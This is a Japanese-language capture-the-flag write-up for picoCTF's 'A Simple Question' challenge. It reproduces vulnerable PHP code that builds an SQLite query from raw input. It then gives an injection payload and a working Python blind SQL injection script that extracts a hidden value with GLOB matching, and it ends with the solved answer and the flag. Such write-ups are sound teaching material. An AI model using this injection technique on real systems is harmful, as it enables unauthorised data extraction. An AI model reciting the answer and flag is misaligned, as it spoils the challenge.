# A Simple Question

## Solve
```
There is a website running at http://2018shell.picoctf.com:32635 (link). 
Try to see if you can answer its question.
```

## Hint
```
no
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83958651-3d55d580-a8af-11ea-9e98-9b5033991ce4.png)

問題のページに移動すると答えを入力するページが表示されました。

このページのソースを見てみると気になるコメンドがありました。

```html
<!-- source code is in answer2.phps -->
```

以上のように書いてあるのでそこにアクセスしてみます、

`http://2018shell.picoctf.com:32635/answer2.phps`

するとPHPのコードがありました。

```php
<?php
  include "config.php";
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  $answer = $_POST["answer"];
  $debug = $_POST["debug"];
  $query = "SELECT * FROM answers WHERE answer='$answer'";
  echo "<pre>";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  echo "</pre>";
?>
<?php
  $con = new SQLite3($database_file);
  $result = $con->query($query);

  $row = $result->fetchArray();
  if($answer == $CANARY)  {
    echo "<h1>Perfect!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  }
  elseif ($row) {
    echo "<h1>You are so close.</h1>";
  } else {
    echo "<h1>Wrong.</h1>";
  }
?>
```

ソースを見ると以下の部分で`answer`が入れられていることがわかります、

```php
$query = "SELECT * FROM answers WHERE answer='$answer'";

if($answer == $CANARY)  {
    echo "<h1>Perfect!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  }
  elseif ($row) {
    echo "<h1>You are so close.</h1>";
  } else {
    echo "<h1>Wrong.</h1>";
  }
```

入力した`answer`が`$CANARY`と合っていれば`FLAG`が表示されるようです。

<br>

見る限りSQLiが出来そうと思われます。

試しに`' or 1=1 --`と入力してみます。

すると以下にように表示されます。

![2](https://user-images.githubusercontent.com/47602064/83958880-e1408080-a8b1-11ea-94a8-f57c429c2d87.png)

```txt
SQL query: SELECT * FROM answers WHERE answer='' or 1=1 --'
You are so close.
```

これにより、SQLiが出来ていることが確認できます。

<br>

今回はSQLiが出来てもflagは得ることが出来ません。

`$CANARY`の内容を得る必要があります。

なので`Blind SQLi`で1文字ずつ当てていきます。

今回は`SQLite`が使用されていたので`SQLite`の`GLOB`関数で文字列パターンマッチをさせます。

```python
#!/usr/bin/python
import requests
import re

def brute():
 final = ''
 while True:
  for i in range(0x20, 0x7f):
   if i != 42 and i != 63: # Removes Unix wildcards '*' and '?'
    params = {'answer': "' UNION SELECT * FROM answers WHERE answer GLOB '{}{}*'; --".format(final, chr(i))}
    r = requests.post('http://2018shell1.picoctf.com:2644/answer2.php', data=params)
    res = r.text

   if 'You are so close.' in res:
    final += chr(i)
    print final
    break
   elif i == 0x7e:
    return final

#main
ans = brute()
print ' Asnwer: ' + ans
flag = requests.post('http://2018shell1.picoctf.com:32635/answer2.php', data={'answer': ans}).text
print ' Flag: ' + re.findall(r'(picoCTF\{.+\})', flag)[0]
```

```
$ python solve.py 
4
41
41A
41An
41And
41AndS
41AndSi
41AndSix
41AndSixS
41AndSixSi
41AndSixSix
41AndSixSixt
41AndSixSixth
41AndSixSixths
 Asnwer: 41AndSixSixths
 Flag: picoCTF{qu3stions_ar3_h4rd_8f84b784}
```

![2](https://user-images.githubusercontent.com/47602064/83961164-81ef6a00-a8cb-11ea-877a-fbe41a7ad9a9.png)

<br><br>

## FLAG: picoCTF{qu3stions_ar3_h4rd_8f84b784}
